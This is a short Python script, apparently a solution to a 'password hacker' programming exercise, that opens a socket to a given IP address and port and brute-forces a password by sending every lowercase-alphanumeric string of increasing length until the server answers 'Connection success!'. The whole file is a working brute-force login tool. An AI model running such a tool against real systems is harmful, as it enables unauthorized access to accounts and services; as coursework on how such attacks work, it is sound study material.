# write your code here
import socket
import sys
import itertools


class Hacker(object):

    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = int(port)
        # self.msg = msg
        self.client_socket = socket.socket()
        self.address = (self.ip_address, self.port)

    def main(self):
        keys = list(map(chr, range(97, 123)))
        keys.extend(list(map(chr, range(48, 58))))
        self.client_socket.connect(self.address)

        i = 1
        while True:
            pass_trial = itertools.product(keys, repeat=i)
            for _ in range(36 ** i):
                msg = ''.join(next(pass_trial))
                self.client_socket.send(msg.encode())
                response = self.client_socket.recv(1024)
                response = response.decode()
                if response == 'Connection success!':
                    print(msg)
                    return
            i += 1

    def closing(self):
        self.client_socket.close()


args = sys.argv
start = Hacker(*args[1:])
start.main()
start.closing()